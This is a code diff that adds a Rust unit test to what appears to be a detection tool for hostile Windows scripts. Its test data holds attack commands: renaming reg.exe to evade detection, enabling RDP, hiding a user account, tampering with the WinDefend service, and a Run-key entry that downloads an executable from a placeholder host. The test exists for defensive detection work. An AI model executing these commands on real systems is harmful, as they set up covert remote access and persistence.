@@ -2273,6 +2273,39 @@ C:\Users\Public\rg.tmp add HKLM\SYSTEM\CurrentControlSet\Services\WinDefend /v S
     }
 
     #[test]
+    fn copied_reg_alias_emits_remote_access_traits() {
+        let script = br#"copy C:\Windows\System32\reg.exe C:\Users\Public\rg.tmp
+C:\Users\Public\rg.tmp add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 1 /f
+C:\Users\Public\rg.tmp add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v defaultuserx /t REG_DWORD /d 0 /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\rg.tmp"#)
+            )),
+            "copied reg alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        for (technique, target) in [
+            ("rdp-enable", "Terminal Server"),
+            ("hidden-user", "defaultuserx"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::RemoteAccess { technique: tk, target: tg, .. }
+                        if tk == technique && tg == target
+                )),
+                "missing copied reg RemoteAccess {technique}/{target}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn reg_add_run_key_unquoted_data_captures_full_child_command() {
         let script = br#"@echo off
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d cmd.exe /c curl -o out.exe https://reg-unquoted.example/p.exe /f
